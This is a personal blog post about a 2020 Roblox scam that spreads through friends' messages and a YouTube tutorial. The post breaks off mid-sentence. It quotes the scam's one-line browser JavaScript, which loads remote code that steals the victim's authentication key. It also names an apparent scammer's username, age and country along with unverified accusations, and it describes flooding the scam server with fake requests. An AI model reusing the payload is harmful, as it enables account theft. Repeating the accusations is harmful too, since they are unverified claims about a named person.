A Roblox Scam

> James 3.16: For where jealousy and selfish ambition exist, there will be disorder and every vile practice. 

On January 28th, 2020, I decided to visit the Roblox.com
website, to check up on things a bit. I saw that I was sent a message
by a Roblox friend, asking me a harmless question.

hi dude
i'm making a game and I wanna put your roblox character into it
could you upload your roblox char texture as a decal and send the link to me
here's a tutorial on how to do it if you don't already know:

They linked me to a Youtube tutorial, and I was instantly suspicious
of a scam. On the Youtube video, I was prompted to run javascript
in my browser.

$.get('//rblx.link')

"rblx.link" runs remote code from a third party website.
That code gets your Roblox authentication key and sends it to their
server, and then sends you to the profile texture as expected.

When I clicked on my friends profile, they were wearing red and blue
Roblox clothes, and the description was changed to:

Ask your parents to vote for Trump this year!
#MAGA2020

They had messed with the wrong person, and they were going to pay.


After studying how the fraud works for a few days, I came up with a clear
explaination of how it works:

It mainly started with a data breach, in which the scammer took anvantage of
and infected.

When an account is hacked, their robux is stolen, and account is filled with
Trump propoganda. They the system messages all their friends, sending the same 
message, therefore, the number of hacked accounts grows exponentially.

I tracked the fraud site's hosting provider to DigitalOcean, so I reported it
and they quickly removed it, effecitively shutting it down.

That lasted 5 hours.

After their host was down, they quickly relocated
to a lesser-known Netherlands based host and changed the description of the
video to a new port on the same domain. 
I then returned by reporting the abusive website to the new host. They didn't respond.

In an effort to try and slow down the efficiency of the system, I wrote
a script to generate fake requests and send them to the server. This
will confuse the real and fake requests, therefore drastically slowing down the 
breaking-into-accounts process.

I proceeded to send hundreds, and sometimes thousands of fake requests to them.

While this was running, I started other investigations.

          May not be used in a video:
          The actual video itself seemed of no value as it was a scam tutorial, but they actually
          blantanly give out their username and the amount of Robux they currently own ($2.8k worth). 
          Visiting his profile, "jordy240797", he gives us his name, "Jordy", his age, 22, and where he lives,
          the Netherlands.

          There was existing research done on this person,
          exposing messages that show that he is a sexual predator, and scammer and
          has a history of stealing other people's work and labeling it as their own.

          There may or may not be a connection between their location and their choice in hosting
          providers. They chose DigitalOcean, then Clouvider Limited. As Clouvider limited is a Netherlandic
          based hosting service, they could easily be connnected.

          The video could also be faked, but the connection is still strong.

After searching more, I figured out it wasn't just one site, but many, although
the Trump propoganda accounts seem to be the most popular. Simply looking though
Youtube shows that many people have been setting up servers to steal accounts in
the exact same way the Trump one was. There
are even tutorials on Youtube showing you how to set it up, and showing
me behind the scenes on how it works.

I modified my script to be interchangable between multiple different
websites, and started spamming again. At the time, this was very secret, and only 1
other person knew about it.

## A Conclusion

Debatably, "Robux" is what makes Roblox bad. More specific, 
targeting children to join a community based on a digital currency is a bad
idea. Sure, it brings people together, you can make friends. The idea sounds good in theory,
but not in practice. What is even more of a bad idea is having the ability to exchange Robux
for real life currency is what makes adults able to take advantage of the platform.

As free money is what adults desire, free Robux is what children desire.
They will do anything and everything to obtain it. 
The people on the other end, the fraudsters, do everything
they possibly can to make their "Robux generators" look legit. This includes things like
adding fake chatrooms, fake recent activity, and even hosting the files on local government
websites.

And it works.

After my motivation to kill off Roblox scams dies off, I decided to send some emails
to the Roblox team. The emails seemed to be written very quickly, and more importantly,
it doesn't look like they passed it to the Roblox security team. (if they even have one)
Here is one of the emails I sent them:


  As the scam takes over many accounts, banning each one will not be effective,
  especially since they were hacked into in the first place.

  I meant not a popup message on the main page, but a message to their inbox,
  the same place where you get messages on the latest "Wonder Woman Items". It would
  greatly increase awareness about the current situation, and help the Roblox community
  to continue to be a safe place.

  Also, it is strange that Youtube links are able to be sent and can pass
  through your messaging system, assuming it was not already fixed.
  
And they responded:

  Hello Dan,

The email was most likely generated. Although in the first email, one line seemed to be unique.
> We appreciate you taking the time to write in with your feedback for Roblox and want to confirm that your suggestion regarding the issuing a warning message to the users regarding this propaganda has been received.


This means they are completely fine with 



- Other scams
Roblox scams have been active for years. This particular one differs from the others,
which offer free Robux, a digital currency used in Roblox. Instead of offering free things, it
uses trust.
As you know the person and they are your friend, you trust them. After all, it seems 
like a harmless message, and running the Javascript can't do **that** much harm, right?
